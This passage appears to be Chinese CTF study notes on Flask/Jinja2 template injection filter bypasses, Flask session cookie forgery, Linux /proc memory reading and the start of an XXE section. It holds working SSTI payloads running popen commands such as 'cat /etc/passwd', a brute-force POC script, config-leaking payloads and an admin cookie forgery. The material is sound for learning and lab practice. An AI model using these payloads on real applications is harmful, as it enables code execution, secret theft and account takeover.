    girls = ['安其拉', '王昭君', '艾琳', '艾希', '李元芳']
    return flask.render_template("index.html", girls=girls)


if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0")

```

**index.html**

注意记住格式照套就行

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
</head>
<body>
<p>index 页面</p>
<ul>
    {% for girl in girls%}
    	<li>{{ girl }}</li>
    {% endfor %}
</ul>
</body>
</html>
```

#### flask模板if判断

**app.py**

```py
import flask

app = flask.Flask(__name__)


@app.route("/")
def index():
    girls = ['安其拉', '王昭君', '艾琳', '艾希', '李元芳']
    return flask.render_template("index.html", girls=girls)


if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0")

```

**index.html**

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        .a{
            color: red;
            font-weight:bold;
        }
    </style>
</head>
<body>
<p>index 页面</p>
<ul>
    {% for girl in girls%}
        {% if girl|length >= 3 %}
            <li class="a">{{ girl }}</li>
        {% else %}
            <li>{{ girl }}</li>
        {% endif %}
    {% endfor %}
</ul>
</body>
</html>
```

#### flask模板变量

![image-20230902184656320](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230902184656320.png)

### 2. 绕过思路

![image-20230902184904928](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230902184904928.png)

**索引搜索POC代码**

```py
import requests

base_url = 'http://192.168.231.129:18080/flasklab/level/2'
target_function = "popen"

for i in range(500):
    payload = "{% if ''.__class__.__base__.__subclasses__()[" + str(i) +"].__init__.__globals__['popen']('cat /etc/passwd').read()%}benben{%endif%}"
    data = {"code": payload}
    try:
        res = requests.post(base_url, data=data)
        # print(res.text)
        if 'benben' in res.text:
            print("可利用索引：{}；\npayload：{}".format(i, payload))
    except Exception as e:
        print(e)

```

### 3. 解题流程

#### a. 搜索索引值

运行POC代码得到的结果：

```
可利用索引：117；
payload：{% if ''.__class__.__base__.__subclasses__()[117].__init__.__globals__['popen']('cat /etc/passwd').read()%}benben{%endif%}
```

可知到索引值为117

#### b. 输出结果

![image-20230902185046050](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230902185046050.png)

![image-20230902185228558](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230902185228558.png)

![image-20230827203210371](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230827203210371.png)

## 0x10 getitem绕过中括号过滤

### 1. `__getitem__`魔术方法

**对字典使用时，传入字符串，返回字典响应键所对应的值**

对列表使用时，传入整数返回列表索引值

```py
dict1 = {
    '1': 'a',
    '2': 'b',
    '3': 'c'
}

print(dict1.__getitem__('1'))		# 等于：dict['1']

# 输出
b
```

### 2. 解题流程

将中括号的地方改成使用`__getitem__`即可

```
payload：code={{''.__class__.__base__.__subclasses__().__getitem__(117).__init__.__globals__.__getitem__('popen')('cat /flag').read()}} 
```

![image-20230827233510691](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230827233510691.png)

## 0x11 request 绕过单双引号过滤

> 这里的 request 并非python中的 requests 模块，而是flask中的 request

### 1. 前置知识

![image-20230828134401918](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230828134401918.png)

#### GET | POST | Cookie 传参

**app.py**

```
import flask

app = flask.Flask(__name__)


@app.route("/", methods=['POST', 'GET'])
def index():
    return flask.render_template("index.html")


if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0")
```

**index.html**

```py
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        .a{
            color: red;
            font-weight:bold;
        }
    </style>
</head>
<body>
<p>index 页面</p>
<p>GET 传参：{{ request.args.k1 }}</p>
<p>POST 传参：{{ request.form.k1 }}</p>
<p>Cookie 传参：{{ request.cookies.k1}}</p>
</body>
</html>
```

### 2. 绕过实战

因为不能使用单双引号，所以在返回字典时，无法使用直接 键（str）来获取值，此时可以使用：`xxx.__globals__[request.args.k1]`

#### GET 传参绕过

```
payload：
code={{[].__class__.__base__.__subclasses__()[117].__init__.__globals__[request.args.popen](request.args.cmd).read()}}

GET 传参：
popen=popen&cmd=cat /flag
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230828135357227.png" alt="image-20230828135357227" style="zoom:67%;" />

#### POST传参

```
payload：
code={{[].__class__.__base__.__subclasses__()[117].__init__.__globals__[request.form.popen](request.form.cmd).read()}}&popen=popen&cmd=cat /flag
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230828135455299.png" alt="image-20230828135455299" style="zoom:67%;" />

#### Cookie 传参

```
payload：
code={{[].__class__.__base__.__subclasses__()[117].__init__.__globals__[request.cookies.popen](request.cookies.cmd).read()}}

Cookie 传参：
popen=popen;cmd=cat /flag
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230828135611577.png" alt="image-20230828135611577" style="zoom:67%;" />

## 0x12 过滤器过下划线绕过

### 1. 前置知识

#### flask常用过滤器

```
length() # 获取一个序列或者字典的长度并将其返回
int()：# 将值转换为int类型；
float()：# 将值转换为float类型；
lower()：# 将字符串转换为小写；
upper()：# 将字符串转换为大写；
reverse()：# 反转字符串；
replace(value,old,new)： # 将value中的old替换为new
list()：# 将变量转换为列表类型；
string()：# 将变量转换成字符串类型；
join()：# 将一个序列中的参数值拼接成字符串,通常有python内置的dict()配合使用
attr(): # 获取对象的属性
```

#### 简单使用

**app.py**

```py
import flask

app = flask.Flask(__name__)


@app.route("/", methods=['POST', 'GET'])
def index():
    girls = ['安其拉', '王昭君', '艾琳', '艾希', '李元芳']
    user = "woyaodaxie"
    return flask.render_template("index.html", girls=girls, user=user)


if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0")

```

**index.html**

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        .a{
            color: red;
            font-weight:bold;
        }
    </style>
</head>
<body>
<p>index 页面</p>
<p>列表长度：{{ girls|length }}</p>
{{girls.append("卡特琳娜")}}
<p>列表长度：{{ girls|length }}</p>
<p>{{ user|upper}}</p>
    
<p>{{''|attr('__class__')}}</p>
</body>
</html>
```

![image-20230828143442358](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230828143442358.png)



### 2. 绕过实战

#### `attr()`绕过下划线

```
payload：
code={{''|attr(request.args.cls)|attr(request.args.bas)|attr(request.args.sub)()|attr(request.args.geti)(117)|attr(request.args.ini)|attr(request.args.glo)|attr(request.args.geti)('popen')('cat /flag')|attr('read')()}}

GET 传参：
cls=__class__&bas=__base__&sub=__subclasses__&geti=__getitem__&ini=__init__&glo=__globals__
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230828144840762.png" alt="image-20230828144840762" style="zoom:67%;" />

#### Unicode编码绕过

```
payload：
code={{''|attr("\u005F\u005F\u0063\u006C\u0061\u0073\u0073\u005F\u005F")|attr("\u005F\u005F\u0062\u0061\u0073\u0065\u005F\u005F")|attr("\u005F\u005F\u0073\u0075\u0062\u0063\u006C\u0061\u0073\u0073\u0065\u0073\u005F\u005F")()|attr("\u005F\u005F\u0067\u0065\u0074\u0069\u0074\u0065\u006D\u005F\u005F")(117)|attr("\u005F\u005F\u0069\u006E\u0069\u0074\u005F\u005F")|attr("\u005F\u005F\u0067\u006C\u006F\u0062\u0061\u006C\u0073\u005F\u005F")|attr("\u005F\u005F\u0067\u0065\u0074\u0069\u0074\u0065\u006D\u005F\u005F")("popen")("cat /flag")|attr('read')()}}

payload 原型：
{{''|attr('__class__')|attr(__base__)|attr(__subclasses__)()|attr(__getitem__)(117)|attr(__init__)|attr(__globals__)|attr(__getitem__)('popen')('cat /flag')|attr('read')()}}
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230828145528225.png" alt="image-20230828145528225" style="zoom:67%;" />

#### 16位编码

```
payload：
code={{()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbase\x5f\x5f"]["\x5f\x5fsubclasses\x5f\x5f"]()[199]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["os"].popen("ls").read()}}
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230828150207220.png" alt="image-20230828150207220" style="zoom:67%;" />

## 0x13 中括号绕过点过滤

### 1. attr绕过

使用 attr 也不会出现`.`

```
payload:
code={{''|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(117)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen')('cat /flag')|attr('read')()}}
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230828151159447.png" alt="image-20230828151159447" style="zoom:67%;" />

### 2. 中括号绕过

python 语法中除了可以使用`.`来访问对象属性外，还可以使用`[]`来访问

```
payload：
code={{''['__class__']['__base__']['__subclasses__']()[117]['__init__']['__globals__']['popen']('cat /flag')['read']()}}
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230828152128112.png" alt="image-20230828152128112" style="zoom:67%;" />

## 0x13 饶过关键字过滤

### 1. 编码绕过

使用 Unicode、16位编码等方式绕过

```
payload：
{{''|attr("\u005F\u005F\u0063\u006C\u0061\u0073\u0073\u005F\u005F")|attr("\u005F\u005F\u0062\u0061\u0073\u0065\u005F\u005F")|attr("\u005F\u005F\u0073\u0075\u0062\u0063\u006C\u0061\u0073\u0073\u0065\u0073\u005F\u005F")()|attr("\u005F\u005F\u0067\u0065\u0074\u0069\u0074\u0065\u006D\u005F\u005F")(117)|attr("\u005F\u005F\u0069\u006E\u0069\u0074\u005F\u005F")|attr("\u005F\u005F\u0067\u006C\u006F\u0062\u0061\u006C\u0073\u005F\u005F")|attr("\u005F\u005F\u0067\u0065\u0074\u0069\u0074\u0065\u006D\u005F\u005F")("popen")("cat /flag")|attr('read')()}}

payload 原型：
{{''|attr('__class__')|attr(__base__)|attr(__subclasses__)()|attr(__getitem__)(117)|attr(__init__)|attr(__globals__)|attr(__getitem__)('popen')('cat /flag')|attr('read')()}}
```



```
payload:
payload：
code={{()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbase\x5f\x5f"]["\x5f\x5fsubclasses\x5f\x5f"]()[199]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["os"].popen("ls").read()}}
```

### 2. 字符串拼接

用`+`连接字符串：`'__cl'+'ass__'`

```
payload：
code={{''['__cl'+'ass__']['__bas'+'e__']['__subcla'+'sses__']()[117]['__ini'+'t__']['__glob'+'als__']['po'+'pen']('cat /flag').read()}}
```

### 3. `~`拼接

![image-20230902185357324](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230902185357324.png)

![image-20230902185520544](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230902185520544.png)

### 4. 使用过滤器（reverse反转、replace替换、join拼接等）

#### reverse反转

![image-20230902185533548](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230902185533548.png)

#### replace替换

![image-20230902185542117](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230902185542117.png)

![image-20230828203905003](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230828203905003.png)

#### join拼接

![image-20230902185555482](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230902185555482.png)

![image-20230828204025438](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230828204025438.png)

## 0x14 `length`过滤器绕过数字过滤

### 1. 前置知识

以操作符来分割

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
</head>
<body>
<p>数量：{{'aaaaaaaaaaaa'|length*'aaaaaaaaaa'|length-'aaa'|length}}</p>
</body>
</html>

<!--输出：117-->
```

### 2. 绕过实战

先定义一个变量来存储数字

![image-20230902185609618](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230902185609618.png)

![image-20230828205237772](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230828205237772.png)

## 0x15 获取config文件

这个先记住可通过这两条payload来获取config文件的内容就好

```
payload:
{{url_for.__globals__['current_app'].config}}
{{get_flashed_messages.__globals__['current_app'].config}}
```

## 0x16 混合过滤一

```
目标WAF: bl[’’’, ‘"’, ‘+’, ‘request’, ‘.’, ‘[’, ‘]’]
```

### 1. 前置知识

注意通过 list 过滤器将对象转换为列表

![image-20230902185629649](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230902185629649.png)

**组装语句：`cat flag`**

![image-20230902185705408](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230902185705408.png)

### 2. 绕过实战

使用 join 提取变量名

![image-20230902185712877](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230902185712877.png)

![image-20230829152817366](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230829152817366.png)

## 0x17 混合过滤二

![image-20230829172702086](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230829172702086.png)

# FLASK Session 伪造

## 1. 认识Flask Session

除了请求对象之外还有一种称为 [`session`](https://dormousehole.readthedocs.io/en/latest/api.html#flask.session) 的对象，允许您在 不同请求之间储存信息。这个对象相当于用密钥签名加密的 cookie ，即用户 可以查看您的 cookie ，但是如果没有密钥就无法修改它。

使用会话之前您必须设置一个密钥。举例说明:

```python
import flask
from flask import session,request,redirect,url_for

app = flask.Flask(__name__)
# 指定 secret_key
app.secret_key = '123456'


@app.route('/')
def index():
    if 'username' in session:
        print(session)
        return f'Logged in as {session["username"]}'
    return 'You are not logged in'

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        session['username'] = request.form['username']
        return redirect(url_for('index'))
    return '''
        <form method="post">
            <p><input type=text name=username>
            <p><input type=submit value=Login>
        </form>
    '''


if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0")
```

在`/login`中登录`sugar`用户拿到了下面的Cookie

```
eyJ1c2VybmFtZSI6InN1Z2FyIn0.ZVeIiA.Y-4ERNC7D9bs9nxtDvf2YiGROJE
Cookie 格式：base64加密的Session数据(经过了json、zlib压缩处理的字符串) . 时间戳 . 签名
```

***时间戳***用来告诉服务端数据最后一次更新的时间，超过31天的会话，将会过期，变为无效会话；***签名***是利用`Hmac`算法，将session数据和时间戳加上`secret_key`加密而成的，用来保证数据没有被修改。

## 2. Flask Session 加解密

> 工具地址：https://github.com/noraj/flask-session-cookie-manager

### 2.1 使用方法

#### Encode

```
usage: flask_session_cookie_manager{2,3}.py encode [-h] -s <string> -t <string>

optional arguments:
  -h, --help            show this help message and exit
  -s <string>, --secret-key <string>
                        Secret key
  -t <string>, --cookie-structure <string>
                        Session cookie structure
```

#### Decode

```
usage: flask_session_cookie_manager{2,3}.py decode [-h] [-s <string>] -c <string>

optional arguments:
  -h, --help            show this help message and exit
  -s <string>, --secret-key <string>
                        Secret key
  -c <string>, --cookie-value <string>
                        Session cookie value
```

#### Examples

```bash
# 加密；由于加密的时间戳不一样，所以后面两段也会不一样
┌──(root㉿kali)-[/home/kali/ctfTool/web/flask-session-cookie-manager]
└─# python3 flask_session_cookie_manager3.py encode -s '123456' -t "{'username': 'sugar'}"
eyJ1c2VybmFtZSI6InN1Z2FyIn0.ZVeMxQ.Q_Jii2nKHpZbCIE0PpC-wu2nSLg

# 解密：
┌──(root㉿kali)-[/home/kali/ctfTool/web/flask-session-cookie-manager]
└─# python3 flask_session_cookie_manager3.py decode -s '123456' -c 'eyJ1c2VybmFtZSI6InN1Z2FyIn0.ZVeIiA.Y-4ERNC7D9bs9nxtDvf2YiGROJE'
{'username': 'sugar'}
```

## 3. Flask Session 伪造

**伪造前期：拿到`SECRET_KEY`**

将上面的 Flask 代码在本地搭建

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231118001507347.png" alt="image-20231118001507347" style="zoom: 67%;" />

路由到`/login`登录

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231118001535832.png" alt="image-20231118001535832" style="zoom: 67%;" />

单击login后可看到我们现在的身份是：sugar

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231118001607950.png" alt="image-20231118001607950" style="zoom: 67%;" />

使用上面的工具伪造一段Session

```bash
┌──(root㉿kali)-[/home/kali/ctfTool/web/flask-session-cookie-manager]
└─# python3 flask_session_cookie_manager3.py encode -s '123456' -t "{'username': 'admin'}"                                         
eyJ1c2VybmFtZSI6ImFkbWluIn0.ZVeQzA.bAPRIEf6W2867fmwCgFuvBG5CXA
```

将这段Session粘贴到Cookie中；用hackbar或者bp，伪造成功！

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231118001737343.png" alt="image-20231118001737343" style="zoom: 67%;" />

# Linux 虚拟文件系统 /proc

## 1. Linux 常用虚拟文件

**/proc/[pid]/auxv**

/proc/[pid]/auxv 包含传递给进程的 ELF 解释器信息，格式是每一项都是一个 unsigned long长度的 ID 加上一个 unsigned long 长度的值。最后一项以连续的两个 0x00 开头。举例如下：

```
$ hexdump -x /proc/2406/auxv

0000000    0021    0000    0000    0000    f000    f7fa    7fff    0000
0000010    0010    0000    0000    0000    fbff    1f8b    0000    0000
0000020    0006    0000    0000    0000    1000    0000    0000    0000
0000030    0011    0000    0000    0000    0064    0000    0000    0000
0000040    0003    0000    0000    0000    0040    0040    0000    0000
0000050    0004    0000    0000    0000    0038    0000    0000    0000
0000060    0005    0000    0000    0000    0007    0000    0000    0000
0000070    0007    0000    0000    0000    0000    0000    0000    0000
0000080    0008    0000    0000    0000    0000    0000    0000    0000
0000090    0009    0000    0000    0000    55e0    0045    0000    0000
00000a0    000b    0000    0000    0000    0000    0000    0000    0000
00000b0    000c    0000    0000    0000    0000    0000    0000    0000
00000c0    000d    0000    0000    0000    0000    0000    0000    0000
00000d0    000e    0000    0000    0000    0000    0000    0000    0000
00000e0    0017    0000    0000    0000    0000    0000    0000    0000
00000f0    0019    0000    0000    0000    f079    f7f6    7fff    0000
0000100    001f    0000    0000    0000    ffea    f7f6    7fff    0000
0000110    000f    0000    0000    0000    f089    f7f6    7fff    0000
0000120    0000    0000    0000    0000    0000    0000    0000    0000
0000130
```

**/proc/[pid]/cmdline**

/proc/[pid]/cmdline 是一个只读文件，包含进程的完整[命令](https://www.linuxcool.com/)行信息。如果该进程已经被交换出内存或者这个进程是 zombie 进程，则这个文件没有任何内容。该文件以空字符 null 而不是换行符作为结束标志。举例如下：

```
$ ps aux|grep frps
root      2406  0.1  0.1  54880 10524 ?        Sl   Dec11  21:30 frps -c ./frps.ini

$ cat /proc/2406/cmdline
frps-c./frps.ini
```

**/proc/[pid]/comm**

/proc/[pid]/comm 包含进程的[命令](https://www.linuxcool.com/)名。举例如下：

```
$ cat /proc/2406/comm
frps
```

**/proc/[pid]/cwd**

/proc/[pid]/cwd 是进程当前工作目录的符号链接。举例如下：

```
$ ls -lt /proc/2406/cwd
lrwxrwxrwx 1 root root 0 Dec 12 20:39 /proc/2406/cwd -> /home/mike/frp_0.13.0_linux_amd64
```

**/proc/[pid]/environ**

/proc/[pid]/environ 显示进程的环境变量。举例如下：

```
$ strings /proc/2406/environ

SUPERVISOR_GROUP_NAME=ssh
TERM=linux
SUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sock
SUPERVISOR_PROCESS_NAME=ssh
RUNLEVEL=2
UPSTART_EVENTS=runlevel
PREVLEVEL=N
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
UPSTART_INSTANCE=
UPSTART_JOB=rc
SUPERVISOR_ENABLED=1
runlevel=2
PWD=/
previous=N
```

**/proc/[pid]/exe**

/proc/[pid]/exe 为实际运行程序的符号链接。举例如下：

```
$ ls -lt /proc/2406/exe
lrwxrwxrwx 1 root root 0 Dec 11 19:00 /proc/2406/exe -> /usr/bin/frps
```

**/proc/[pid]/fd**

/proc/[pid]/fd 是一个目录，包含进程打开文件的情况。举例如下：

```
$ ls -lt /proc/2406/fd

lrwx------ 1 root root 64 Dec 24 09:39 77 -> socket:[44377722]
lrwx------ 1 root root 64 Dec 17 15:07 47 -> socket:[29482617]
lr-x------ 1 root root 64 Dec 12 20:18 0 -> pipe:[13282]
l-wx------ 1 root root 64 Dec 12 20:18 1 -> pipe:[13283]
lrwx------ 1 root root 64 Dec 12 20:18 10 -> socket:[12238218]
lrwx------ 1 root root 64 Dec 12 20:18 4 -> anon_inode:[eventpoll]
lrwx------ 1 root root 64 Dec 12 20:18 40 -> socket:[19378614]
```

目录中的每一项都是一个符号链接，指向打开的文件，数字则代表文件描述符。

**/proc/[pid]/latency**

/proc/[pid]/latency 显示哪些代码造成的延时比较大。如果要使用这个特性需要执行：

```
$ echo 1 > /proc/sys/kernel/latencytop
```

举例如下

```
$ cat /proc/2406/latency

Latency Top version : v0.1
30667 10650491 4891 poll_schedule_timeout do_sys_poll SyS_poll system_call_fastpath 0x7f636573dc1d
8 105 44 futex_wait_queue_me futex_wait do_futex SyS_futex system_call_fastpath 0x7f6365a167bc
```

每一行前三个数字分别是后面代码执行的次数、总共执行延迟时间(单位是微秒)和最长执行延迟时间(单位是微秒)。后面则是代码完整的调用栈。

**/proc/[pid]/maps**

/proc/[pid]/maps 显示进程的内存区域映射信息。举例如下：

```
$ cat /proc/2406/maps
00400000-006ea000 r-xp 00000000 fd:01 1727569                            /usr/bin/frps
006ea000-00a6c000 r--p 002ea000 fd:01 1727569                            /usr/bin/frps
00a6c000-00ab1000 rw-p 0066c000 fd:01 1727569                            /usr/bin/frps
00ab1000-00ad4000 rw-p 00000000 00:00 0
c000000000-c00000b000 rw-p 00000000 00:00 0
c41feac000-c420000000 rw-p 00000000 00:00 0
c420000000-c420400000 rw-p 00000000 00:00 0
c420400000-c420700000 rw-p 00000000 00:00 0
c420700000-c420800000 rw-p 00000000 00:00 0
c420800000-c420900000 rw-p 00000000 00:00 0
c420900000-c420a00000 rw-p 00000000 00:00 0
c420a00000-c421ea0000 rw-p 00000000 00:00 0
c421ea0000-c422a00000 rw-p 00000000 00:00 0
c422a00000-c422a60000 rw-p 00000000 00:00 0
7f0418c01000-7f0418ee1000 rw-p 00000000 00:00 0
7ffff7f4f000-7ffff7f70000 rw-p 00000000 00:00 0                          [stack:5121]
7ffff7fad000-7ffff7faf000 r--p 00000000 00:00 0                          [vvar]
7ffff7faf000-7ffff7fb1000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
```

其中注意的一点是 [stack:] 是线程的堆栈信息，对应于 /proc/[pid]/task/[tid]/ 路径。

**/proc/[pid]/root**

/proc/[pid]/root 是进程根目录的符号链接。举例如下：

```
$  ls -lt /proc/2406/root
lrwxrwxrwx 1 root root 0 Dec 12 20:39 /proc/2406/root -> /
```

**/proc/[pid]/stack**

/proc/[pid]/stack 示当前进程的内核调用栈信息，只有内核编译时打开了 CONFIG_STACKTRACE 编译选项，才会生成这个文件。举例如下：

```
$ cat /proc/2406/stack
[] futex_wait_queue_me+0xc6/0x130
[] futex_wait+0x17d/0x270
[] do_futex+0xd5/0x520
[] SyS_futex+0x71/0x150
[] entry_SYSCALL_64_fastpath+0x16/0x75
[] 0xffffffffffffffff
```

**/proc/[pid]/statm**

/proc/[pid]/statm 显示进程所占用内存大小的统计信息。包含七个值，度量单位是 page(page大小可通过 getconf PAGESIZE 得到)。举例如下：

```
$ cat /proc/2406/statm
13720 2617 493 746 0 12007 0
```

各个值含义：

```
a）进程占用的总的内存
b）进程当前时刻占用的物理内存
c）同其它进程共享的内存
d）进程的代码段
e）共享库(从2.6版本起，这个值为0)
f）进程的堆栈
g）dirty pages(从2.6版本起，这个值为0)
```

**/proc/[pid]/status**

/proc/[pid]/status 包含进程的状态信息。其很多内容与 /proc/[pid]/stat 和 /proc/[pid]/statm 相同，但是却是以一种更清晰地方式展现出来。举例如下：

```
$ cat /proc/2406/status
Name:   frps
State:  S (sleeping)
Tgid:   2406
Ngid:   0
Pid:    2406
PPid:   2130
TracerPid:  0
Uid:    0   0   0   0
Gid:    0   0   0   0
FDSize: 128
Groups: 0
NStgid: 2406
NSpid:  2406
NSpgid: 2406
NSsid:  2130
VmPeak:    54880 kB
VmSize:    54880 kB
VmLck:         0 kB
VmPin:         0 kB
VmHWM:     34872 kB
VmRSS:     10468 kB
VmData:    47896 kB
VmStk:       132 kB
VmExe:      2984 kB
VmLib:         0 kB
VmPTE:        68 kB
VmPMD:        20 kB
VmSwap:        0 kB
HugetlbPages:          0 kB
Threads:    11
SigQ:   0/31834
SigPnd: 0000000000000000
ShdPnd: 0000000000000000
SigBlk: 0000000000000000
SigIgn: 0000000000000000
SigCgt: fffffffe7fc1feff
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
Seccomp:    0
Cpus_allowed:   f
Cpus_allowed_list:  0-3
Mems_allowed:   00000000,00000001
Mems_allowed_list:  0
voluntary_ctxt_switches:    2251028
nonvoluntary_ctxt_switches: 18031
```

关于信号（signal）的信息：SigQ 分为两部分（例如 0/31834），前面表示当前处在队列中的信号（0），后面则表示队列一共可以存储多少信号（31834）；SigPnd 表示当前线程 pending 的信号，而ShdPnd 则表示整个进程 pending 的信号；SigBlk、SigIgn 和 SigCgt 分别表示对信号的处理是阻塞，忽略，还是捕获。（关于Unix信号的相关知识，可以参考 Unix: Dealing with signals）。

**/proc/[pid]/syscall**

/proc/[pid]/syscall 显示当前进程正在执行的系统调用。举例如下：

```
$ cat /proc/2406/syscall
202 0xab3730 0x0 0x0 0x0 0x0 0x0 0x7ffff7f6ec68 0x455bb3
```

第一个值是系统调用号（202代表poll），后面跟着 6 个系统调用的参数值（位于寄存器中），最后两个值依次是堆栈指针和指令计数器的值。如果当前进程虽然阻塞，但阻塞函数并不是系统调用，则系统调用号的值为 -1，后面只有堆栈指针和指令计数器的值。如果进程没有阻塞，则这个文件只有一个 running 的字符串。

内核编译时打开了 CONFIG_HAVE_ARCH_TRACEHOOK 编译选项，才会生成这个文件。

**/proc/[pid]/wchan**

/proc/[pid]/wchan 显示当进程 sleep 时，kernel 当前运行的函数。举例如下：

```
$ cat /proc/2406/wchan
futex_wait_queue_meadmin
```

**/proc/[pic]/mem**

访问指定程序的内存信息，由于有一些内存空间没有权限问，所以会报错

```bbash
┌──(kali㉿kali)-[~/test]
└─$ sudo cat /proc/2663/mem    
cat: /proc/2663/mem: 输入/输出错误
```

## 2. Linux 访问内存文件

使用**/proc/[pid]/maps**可查看程的内存区域映射信息。一般权限是`rw-`的才能读取

```bash
55b8a2ccf000-55b8a2cd3000 rw-p 00000000 00:00 0 
55b8a345b000-55b8a349f000 rw-p 00000000 00:00 0                          [heap]
55b8a349f000-55b8a367b000 rw-p 00000000 00:00 0                          [heap]
55b8a367b000-55b8a36c2000 rw-p 00000000 00:00 0                          [heap]
```

使用python脚本访问相应的内存信息

```py
# 十六进制转十进制
seek_start = int('55b8a349f000', 16)
seek_end = int('55b8a367b000', 16)
with open('/proc/2663/mem', 'rb') as f:
    # 将光标定位到有权访问的位置
    f.seek(seek_start)
   	# 访问有权访问的长度
    data = f.read(seek_end - seek_start)

print(data)
```

## 3. Python 批量访问脚本

```py
import re


def read_mem(pid):
    # 读取 maps 文件
    with open(f"/proc/{pid}/maps", 'rb') as f:
        # 将 maps.txt 信息写入记事本
        with open('maps.txt', 'wb') as j:
            j.write(f.read())

    # 55b8a2ccb000-55b8a2ccf000
    # 逐行读取 maps.txt
    with open('maps.txt', 'r') as f:
        # 逐行读取文件
        for line in f:
            if 'rw-p' in line:
                start = re.search('([0-9a-z]{12})-', line)
                end = re.search('-([0-9a-z]{12})', line)

                # 格式处理
                start = int(str(start.group(1)), 16)
                end = int(str(end.group(1)), 16)
                with open(f'/proc/{pid}/mem', 'rb') as mem:
                    mem.seek(start)
                    mem_data = mem.read(end - start)

                    # 得到的结果最后保存
                    with open('result.txt', 'wb') as res:
                        res.write(mem_data)


if __name__ == '__main__':
    # 你要访问的内存他的PID是多少这里就是多少
    read_mem(2663)
```

# XXE注入

## 1. PHP 解析XML

### 1. PHP XML DOM

#### 1.1 XML 解析

如需读取和更新 - 创建和处理 - 一个 XML 文档，您需要 XML 解析器。

有两种基本的 XML 解析器类型：

- 基于树的解析器：这种解析器把 XML 文档转换为树型结构。它分析整篇文档，并提供了对树中元素的访问，例如文档对象模型 (DOM)。
- 基于事件的解析器：将 XML 文档视为一系列的事件。当某个具体的事件发生时，解析器会调用函数来处理。

DOM 解析器是基于树的解析器。

请看下面的 XML 文档片段：

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<from>Jani</from>
```

XML DOM 把上面的 XML 视为一个树形结构：

- Level 1: XML 文档
- Level 2: 根元素： `<from>`
- Level 3: 文本元素： `Jani`

#### 1.2 XML 文件

将下面的内容保存名为：`text.xml`

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<note>
<to>Tove</to>
<from>Jani</from>
<heading>Reminder</heading>
<body>Don't forget me this weekend!</body>
</note>
```

#### 1.3 加载和输出XML

```php
<?php
$xmlDoc = new DOMDocument();
# 把 test.xml 加载到这个文档对象中
